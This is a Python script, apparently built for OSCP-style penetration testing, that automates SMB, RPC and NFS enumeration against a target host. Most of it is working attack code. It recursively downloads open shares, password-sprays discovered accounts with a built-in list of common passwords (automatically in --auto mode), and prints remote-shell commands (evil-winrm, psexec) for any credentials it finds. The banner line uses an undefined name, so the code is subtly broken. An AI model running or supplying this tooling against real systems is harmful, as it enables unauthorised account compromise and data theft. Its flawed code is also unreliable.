```python
#!/usr/bin/env python3
"""
post_enum.py - SMB/RPC/NFS enumeration after enum4linux
Usage: python3 post_enum.py -t 10.10.10.5 --auto
"""

import argparse
import subprocess
import sys
import os
import re
import time
import json
import shutil
from datetime import datetime

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[1m'
X = '\033[0m'

def info(s): print(f"{C}[*]{X} {s}")
def good(s): print(f"{G}[+]{X} {s}")
def warn(s): print(f"{Y}[!]{X} {s}")
def bad(s): print(f"{R}[-]{X} {s}")
def head(s): print(f"\n{B}{C}{'-'*60}{X}\n{B}  {s}{X}\n{'-'*60}")

def run_enum4linux(target, output_file=None):
    info(f"Running enum4linux against {target}...")
    cmd = ["enum4linux", "-a", target]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        out = result.stdout + result.stderr
        if output_file:
            with open(output_file, "w") as f:
                f.write(out)
            good(f"Output saved to {output_file}")
        return out
    except FileNotFoundError:
        bad("enum4linux not found. Install or provide --from-file.")
        return ""
    except subprocess.TimeoutExpired:
        warn("enum4linux timed out after 120s — partial results may have been captured")
        return ""

def parse_enum4linux(text):
    findings = {
        "users": [],
        "shares": [],
        "groups": [],
        "os_info": {},
        "password_policy": {},
        "domain": None,
        "workgroup": None,
        "anon_smb": False,
        "anon_rpc": False,
        "raw": text,
    }

    m = re.search(r'OS=\[([^\]]+)\]', text)
    if m:
        findings["os_info"]["os"] = m.group(1)
    m = re.search(r'Domain=\[([^\]]+)\]', text)
    if m:
        findings["domain"] = m.group(1)
    m = re.search(r'Workgroup=\[([^\]]+)\]', text)
    if m:
        findings["workgroup"] = m.group(1)

    user_blocks = re.findall(r'user:\[([^\]]+)\]\s+rid:\[([^\]]+)\]', text)
    for username, rid in user_blocks:
        findings["users"].append({"name": username.strip(), "rid": rid.strip()})

    for line in text.splitlines():
        if re.match(r'\s+index: 0x', line):
            m = re.search(r"Account: (\S+)\s+Name:", line)
            if m and m.group(1) not in [u["name"] for u in findings["users"]]:
                findings["users"].append({"name": m.group(1), "rid": "?"})

    for line in text.splitlines():
        sm = re.match(r'\s+(\S+)\s+Disk\s+(.*)', line)
        if sm:
            findings["shares"].append({
                "name": sm.group(1),
                "comment": sm.group(2).strip(),
                "type": "Disk"
            })
        sm = re.match(r'\s+(\S+)\s+IPC\s+(.*)', line)
        if sm:
            findings["shares"].append({
                "name": sm.group(1),
                "comment": sm.group(2).strip(),
                "type": "IPC"
            })

    if re.search(r'Anonymous login\s+successful', text, re.IGNORECASE):
        findings["anon_smb"] = True
    if re.search(r'rpcclient\s+\$>', text):
        findings["anon_rpc"] = True

    min_len = re.search(r'Minimum password length:\s+(\d+)', text)
    lockout = re.search(r'Account lockout threshold:\s+(\S+)', text)
    if min_len:
        findings["password_policy"]["min_length"] = int(min_len.group(1))
    if lockout:
        findings["password_policy"]["lockout_threshold"] = lockout.group(1)

    return findings

def smb_list_share(target, share, user="", password=""):
    cmd = ["smbclient", f"//{target}/{share}", "-N"]
    if user:
        cmd += ["-U", f"{user}%{password}"]
    cmd += ["-c", "ls"]
    info(f"Listing share: //{target}/{share}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        return r.stdout + r.stderr
    except Exception as e:
        return str(e)

def smb_download_all(target, share, dest, user="", password=""):
    os.makedirs(dest, exist_ok=True)
    cmd = ["smbclient", f"//{target}/{share}", "-N"]
    if user:
        cmd += ["-U", f"{user}%{password}"]
    cmd += ["-c", "recurse ON; prompt OFF; mget *"]
    info(f"Downloading //{target}/{share} -> {dest}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60, cwd=dest)
        return r.stdout + r.stderr
    except Exception as e:
        return str(e)

def smb_check_shares(target, findings, download_dir=None):
    head("SMB Share Enumeration")
    if not findings["shares"]:
        bad("No shares found in enum4linux output")
        return

    for share in findings["shares"]:
        name = share["name"]
        if name in ["IPC$", "print$"]:
            continue
        info(f"Trying share: {name} ({share['comment']})")
        output = smb_list_share(target, name)
        if "NT_STATUS_ACCESS_DENIED" in output:
            bad(f"  {name}: Access denied (auth required)")
        elif "NT_STATUS" in output:
            bad(f"  {name}: {output.strip()[:80]}")
        else:
            good(f"  {name}: ACCESSIBLE")
            print(output[:1000])
            if download_dir:
                dest = os.path.join(download_dir, name)
                result = smb_download_all(target, name, dest)
                good(f"  Downloaded to {dest}")

RPC_QUERIES = [
    ("enumdomusers", "Domain users"),
    ("enumdomgroups", "Domain groups"),
    ("querydominfo", "Domain info"),
    ("enumprivs", "Privileges"),
    ("lsaenumsid", "SIDs"),
]

def rpc_enum(target, user="", password=""):
    head("RPC Anonymous Enumeration")
    auth = f"{user}%{password}" if user else "%"
    for cmd_str, desc in RPC_QUERIES:
        info(f"rpcclient: {cmd_str} ({desc})")
        cmd = ["rpcclient", "-U", auth, "-c", cmd_str, target]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            output = r.stdout.strip()
            if output and "NT_STATUS" not in output:
                good(f"  Result:")
                print("  " + "\n  ".join(output.splitlines()[:20]))
            else:
                bad(f"  Failed: {r.stderr.strip()[:60] or output[:60]}")
        except Exception as e:
            bad(f"  Error: {e}")

def check_nfs(target):
    head("NFS / Mountd Check")
    info(f"Running showmount -e {target}")
    try:
        r = subprocess.run(["showmount", "-e", target], capture_output=True, text=True, timeout=10)
        if r.returncode == 0 and r.stdout.strip():
            good("NFS exports found:")
            print(r.stdout)
            for line in r.stdout.splitlines():
                m = re.match(r'^(/\S+)', line)
                if m:
                    export = m.group(1)
                    warn(f"  Mount suggestion: sudo mount -t nfs {target}:{export} /mnt/nfs -o nolock")
        else:
            bad("No NFS exports (or service not running)")
    except FileNotFoundError:
        bad("showmount not installed")
    except Exception as e:
        bad(f"showmount error: {e}")

DEFAULT_PASSWORDS = [
    "Password1", "Password123", "Welcome1", "Welcome123",
    "Summer2023", "Winter2023", "Spring2024", "Admin123",
    "Passw0rd", "P@ssw0rd", "letmein", "changeme",
    "123456", "qwerty", "", "password",
]

def spray_smb(target, userlist, passwords, lockout_threshold=None, delay=1.0):
    head("SMB Password Spray")
    if lockout_threshold and lockout_threshold.isdigit() and int(lockout_threshold) > 0:
        threshold = int(lockout_threshold)
        warn(f"Lockout policy detected: threshold={threshold}")
        warn(f"Spraying only {min(threshold-1, len(passwords))} password(s) to stay safe")
        passwords = passwords[:threshold - 1]
    else:
        info("No lockout policy detected — full spray")

    valid_creds = []
    for password in passwords:
        info(f"Spraying: '{password}'")
        for user in userlist:
            cmd = ["smbclient", f"//{target}/IPC$", "-U", f"{user}%{password}", "-c", "exit"]
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
                if r.returncode == 0 or "NT_STATUS_LOGON_FAILURE" not in r.stderr:
                    if "NT_STATUS_ACCOUNT_LOCKED_OUT" in r.stderr:
                        warn(f"  LOCKED OUT: {user}")
                    elif "NT_STATUS" not in r.stderr:
                        good(f"  VALID CREDS: {user}:{password}")
                        valid_creds.append((user, password))
            except Exception:
                pass
        time.sleep(delay)

    return valid_creds

def load_wordlist(path, limit=50):
    passwords = []
    try:
        with open(path, "r", errors="ignore") as f:
            for i, line in enumerate(f):
                if i >= limit:
                    break
                pw = line.strip()
                if pw:
                    passwords.append(pw)
    except FileNotFoundError:
        bad(f"Wordlist not found: {path}")
    return passwords

def nmap_services(target):
    head("Quick Service Scan")
    info(f"nmap -sV -sC --top-ports 100 {target}")
    try:
        r = subprocess.run(["nmap", "-sV", "-sC", "--top-ports", "100", target],
                           capture_output=True, text=True, timeout=60)
        print(r.stdout)
        ports = re.findall(r'(\d+)/tcp\s+open\s+(\S+)', r.stdout)
        return {int(p): svc for p, svc in ports}
    except Exception as e:
        bad(f"nmap error: {e}")
        return {}

def print_summary(target, findings, valid_creds=None):
    head("SUMMARY")
    print(f"  Target     : {target}")
    print(f"  OS         : {findings['os_info'].get('os', 'Unknown')}")
    print(f"  Domain     : {findings.get('domain') or findings.get('workgroup', 'Unknown')}")
    print(f"  Anon SMB   : {'YES <' if findings['anon_smb'] else 'no'}")
    print(f"  Anon RPC   : {'YES <' if findings['anon_rpc'] else 'no'}")

    if findings["users"]:
        good(f"Users ({len(findings['users'])}):")
        for u in findings["users"]:
            print(f"    {u['name']} (RID: {u['rid']})")

    if findings["shares"]:
        good(f"Shares ({len(findings['shares'])}):")
        for s in findings["shares"]:
            print(f"    {s['name']} [{s['type']}] — {s['comment']}")

    if findings["password_policy"]:
        pp = findings["password_policy"]
        warn(f"Password Policy: min_len={pp.get('min_length','?')} lockout={pp.get('lockout_threshold','?')}")

    if valid_creds:
        print()
        good(f"{'='*40}")
        good(f"VALID CREDENTIALS FOUND:")
        for u, p in valid_creds:
            good(f"  {u}:{p}")
        good(f"{'='*40}")

    print()
    info("Next steps to consider:")
    steps = []
    if findings["anon_smb"]:
        steps.append("smbclient -N -L //{}  (browse all shares)".format(target))
    if findings["anon_rpc"]:
        steps.append("rpcclient -U '' {} -c 'enumdomusers'".format(target))
    if valid_creds:
        u, p = valid_creds[0]
        steps.append(f"smbclient //{target}/C$ -U '{u}%{p}'")
        steps.append(f"evil-winrm -i {target} -u {u} -p {p}")
        steps.append(f"impacket-psexec {u}:{p}@{target}")
    if not steps:
        steps.append("Try manual RPC: rpcclient -U '' " + target)
        steps.append("Check for web services: curl http://" + target)

    for i, s in enumerate(steps, 1):
        print(f"  {i}. {s}")

def save_report(target, findings, valid_creds, output_path):
    report = {
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "findings": {k: v for k, v in findings.items() if k != "raw"},
        "valid_creds": [{"user": u, "pass": p} for u, p in (valid_creds or [])]
    }
    with open(output_path, "w") as f:
        json.dump(report, f, indent=2)
    good(f"Report saved: {output_path}")

def main():
    ap = argparse.ArgumentParser(description="Post-enum second stage — OSCP edition")
    ap.add_argument("-t", "--target", required=True, help="Target IP")
    ap.add_argument("--from-file", default=None, help="Parse existing enum4linux output file")
    ap.add_argument("--save-enum", default=None, help="Save enum4linux output to file")
    ap.add_argument("--shares", action="store_true", help="Enumerate SMB shares")
    ap.add_argument("--download-all", default=None, metavar="DIR", help="Download accessible shares")
    ap.add_argument("--rpc", action="store_true", help="Run RPC enumeration")
    ap.add_argument("--nfs", action="store_true", help="Check NFS exports")
    ap.add_argument("--spray", action="store_true", help="Password spray users")
    ap.add_argument("--wordlist", default=None, help="Wordlist for spray (default: built-in)")
    ap.add_argument("--spray-limit", default=50, type=int, help="Max passwords from wordlist")
    ap.add_argument("--user", default="", help="Specific user for auth attempts")
    ap.add_argument("--password", default="", help="Specific password")
    ap.add_argument("--nmap", action="store_true", help="Quick nmap service scan")
    ap.add_argument("--report", default=None, help="Save JSON report to file")
    ap.add_argument("--auto", action="store_true", help="Auto-run all applicable checks based on findings")

    args = ap.parse_args()

    print(f"\n{B}{C}post_enum.py — OSCP second-stage enumeration{RESET}")
    print(f"Target: {args.target}  |  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    if args.from_file:
        info(f"Parsing enum4linux output from {args.from_file}")
        with open(args.from_file) as f:
            raw = f.read()
    else:
        raw = run_enum4linux(args.target, output_file=args.save_enum)

    findings = parse_enum4linux(raw)

    head("Parsed Findings")
    good(f"Users found    : {len(findings['users'])}")
    good(f"Shares found   : {len(findings['shares'])}")
    good(f"Anonymous SMB  : {findings['anon_smb']}")
    good(f"Anonymous RPC  : {findings['anon_rpc']}")
    if findings["password_policy"]:
        warn(f"Password policy: {findings['password_policy']}")

    valid_creds = []

    if args.auto:
        args.shares = True
        args.rpc = findings["anon_rpc"]
        args.nfs = True
        args.spray = bool(findings["users"])
        args.nmap = True

    if args.nmap:
        open_ports = nmap_services(args.target)

    if args.shares:
        smb_check_shares(args.target, findings, download_dir=args.download_all)

    if args.rpc or findings["anon_rpc"]:
        rpc_enum(args.target, args.user, args.password)

    if args.nfs:
        check_nfs(args.target)

    if args.spray and findings["users"]:
        userlist = [u["name"] for u in findings["users"]]
        if args.wordlist:
            passwords = load_wordlist(args.wordlist, limit=args.spray_limit)
        else:
            passwords = DEFAULT_PASSWORDS
        threshold = findings["password_policy"].get("lockout_threshold")
        valid_creds = spray_smb(args.target, userlist, passwords, lockout_threshold=threshold)
    elif args.spray:
        bad("No users found to spray — run enum4linux first or use --from-file")

    print_summary(args.target, findings, valid_creds)

    if args.report:
        save_report(args.target, findings, valid_creds, args.report)

if __name__ == "__main__":
    main()
```